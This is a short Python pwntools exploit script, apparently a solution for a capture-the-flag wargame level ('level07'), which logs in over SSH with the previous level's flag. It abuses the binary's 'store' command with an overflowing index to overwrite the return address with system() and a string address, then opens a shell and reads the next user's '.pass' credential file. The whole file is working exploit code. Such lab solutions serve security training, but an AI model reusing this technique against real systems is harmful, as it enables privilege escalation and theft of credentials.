#!/usr/bin/env python

from pwn import *
import os

cwd = os.getcwd()
host = "127.0.0.1"
port = 4242

login = "level07"
binary = login
password = open(cwd + "/level06/flag", "r").read().splitlines()[0]
remotebinary = "/home/users/%s/%s" % (login, binary)

target_login = "level08"

system_addr = str(int("0xf7e6aed0", 16))
str_addr = str(int("0xf7f897ec", 16))
eip_index = "1073741938"

shell = ssh(host=host, port=port, user=login, password=password)

p = shell.process([remotebinary], env={})
p.sendline("store")
p.sendline(system_addr)
p.sendline(eip_index)

p.sendline("store")
p.sendline(str_addr)
p.sendline("116")

p.sendline("quit")

p.clean()
p.sendline("whoami")
p.sendline("cat ~%s/.pass" % target_login)
p.interactive()